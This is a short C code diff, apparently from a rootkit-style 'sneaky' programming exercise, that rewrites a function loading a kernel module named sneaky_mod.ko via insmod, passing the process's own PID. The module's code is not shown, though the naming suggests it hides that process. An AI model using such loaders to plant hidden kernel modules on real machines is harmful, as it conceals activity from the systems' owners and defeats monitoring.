@@ -10,10 +10,24 @@ void print_pid()
 }
 
 void insert_sneaky_mod(int sneaky_pid) {
-  char sneaky_pid_str[100];
-  snprintf(sneaky_pid_str, sizeof(sneaky_pid_str), "sneaky_pid=%d", sneaky_pid);
-  execl("/sbin/insmod", "insmod", "sneaky_mod.ko", sneaky_pid_str, NULL);
-  system(arg);
+  pid_t pid = fork();
+
+  if(pid > 0)
+  {
+    waitpid(pid, NULL, 0);
+  }
+  else if(pid == 0)
+  {
+    char sneaky_pid_str[100];
+    snprintf(sneaky_pid_str, sizeof(sneaky_pid_str), "sneaky_pid=%d", sneaky_pid);
+    execl("/sbin/insmod", "insmod", "sneaky_mod.ko", sneaky_pid_str, NULL);
+    perror("Error executing insmod");
+    exit(EXIT_FAILURE);
+  }
+  else {
+    perror("Error forking");
+    exit(EXIT_FAILURE);
+  }
 }
 
 void waitq() {
